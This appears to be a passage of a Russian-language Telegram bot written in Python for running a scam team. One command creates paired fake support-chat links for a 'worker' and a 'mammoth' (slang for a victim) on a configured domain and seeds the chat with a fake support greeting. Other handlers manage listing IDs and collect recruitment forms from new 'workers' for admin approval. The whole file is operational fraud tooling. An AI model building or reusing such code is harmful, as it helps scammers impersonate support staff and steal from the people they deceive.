        await message.reply('<b>🏴‍☠️ Теперь отправь мне ID обьявления! 🏴‍☠️</b> !', parse_mode='HTML')
    elif button_text == '🔲 Удалить':
        state = dp.current_state(user=message.from_user.id)
        await state.reset_state()
        await state.set_state(TestStates.all()[3])
        await message.reply('<b>🏴‍☠️ Теперь отправь мне ID обьявления! 🏴‍☠️</b> !', parse_mode='HTML')
    elif button_text == '🃏 Чат':
        psw = ''  # предварительно создаем переменную psw
        for x in range(12):
            psw += random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

        button = InlineKeyboardButton('🏴‍☠️ Чат воркера',
                                      url='https://' + cfg.domain + '/support/?admin&chat_key=' + psw)
        button1 = InlineKeyboardButton('🏴‍☠️ Чат мамонта',
                                       url='https://' + cfg.domain + '/support/?chat_key=' + psw)
        inline = InlineKeyboardMarkup().add(button, button1)
        await message.reply(
            '<b>☠️ ВОРКЕР ☠️</b> : https://' + cfg.domain + '/support/?admin&chat_key=' + psw + '\n<b>☠️ МАМОНТ ☠️</b> : https://' +
            cfg.domain + '/support/?chat_key=' + psw,
            reply_markup=inline, parse_mode='HTML')

        async with dp.database.acquire() as con:
            await con.execute(
                f"INSERT INTO chats (text,role,chatkey,workerid) VALUES ('Здравствуйте, чем мы можем вам помочь?','worker', $1, $2);", psw, str(message.from_user.id))
        await dp.database.release(con)

    elif message.from_user.id in new_users.keys():
        text = ""

        if new_users[message.from_user.id].question == 1:

            new_users[message.from_user.id].where_from = message.text
            text = "🧖 Какой опыт в сфере?"

        elif new_users[message.from_user.id].question == 2:
            new_users[message.from_user.id].experience = message.text
            text = "🕔 Сколько времени готов уделять?"
        elif new_users[message.from_user.id].question == 3:
            new_users[message.from_user.id].time = message.text
            text = "🗣 Напиши комментарий к заявке!"
        elif new_users[message.from_user.id].question == 4:
            new_users[message.from_user.id].comment = message.text
            new_users[message.from_user.id].form = \
                f'<b>@{new_users[message.from_user.id].username}' \
                f' (<code>{new_users[message.from_user.id].id}</code>):</b>\n' \
                f'<b>🕶 Узнал</b>: {new_users[message.from_user.id].where_from}\n' \
                f'<b>🧖 Опыт</b>: {new_users[message.from_user.id].experience}\n' \
                f'<b>🕔 Время</b>: {new_users[message.from_user.id].time}\n' \
                f'<b>🗣 Комментарий</b>: {new_users[message.from_user.id].comment}\n'

            m_keyboard = types.InlineKeyboardMarkup(row_width=2)
            text_and_data = (
                ('Отправить пиратику 🏴‍☠️', 'send_form'),
                ('Изменить заявку 💀', 'new_user'),
            )
            row_btns = (types.InlineKeyboardButton(text, callback_data=data) for text, data in text_and_data)
            m_keyboard.row(*row_btns)

            new_users[message.from_user.id].blocked = True

            await message.reply(new_users[message.from_user.id].form,
                                parse_mode='HTML',
                                reply_markup=m_keyboard)
            text = ""
        new_users[message.from_user.id].question += 1
        if text:
            await message.answer(text)
    else:
        if message.chat.type != "private":
            return
        await message.reply('<b>🏴‍☠️🏴‍☠️ Нет такой пиратской команды 🏴‍☠️🏴‍☠️</b> !', parse_mode='HTML')


@dp.callback_query_handler(text='new_user')
async def inline_kb_answer_callback_handler(query: types.CallbackQuery):
    new_users[query.from_user.id] = NewUser(query.from_user.id, query.from_user.username)
    await bot.send_message(query.from_user.id, "🕶 Откуда узнал о нас?")


@dp.callback_query_handler(text='send_form')
async def inline_kb_answer_callback_handler(query: types.CallbackQuery):
    for admin in cfg.admins:
        await bot.send_message(admin, new_users[query.from_user.id].form, parse_mode='HTML')

    new_users[query.from_user.id].sent = True

    await bot.edit_message_text(chat_id=query.message.chat.id, message_id=query.message.message_id,
                                text=new_users[query.from_user.id].form + "\n<b>Отправлено!</b>", parse_mode='HTML')
    await bot.send_message(query.from_user.id, "🏴‍☠️🏴‍☠️🏴‍☠️ Ожидайте ответа главного пирата, в скором времени вы будете приняты 🏴‍☠️🏴‍☠️🏴‍☠️")
    

async def shutdown(dispatcher: Dispatcher):
    await dispatcher.storage.close()
    await dispatcher.storage.wait_closed()


if __name__ == '__main__':
    start_polling(dp, loop=loop, skip_updates=True, on_shutdown=shutdown, on_startup=on_startup)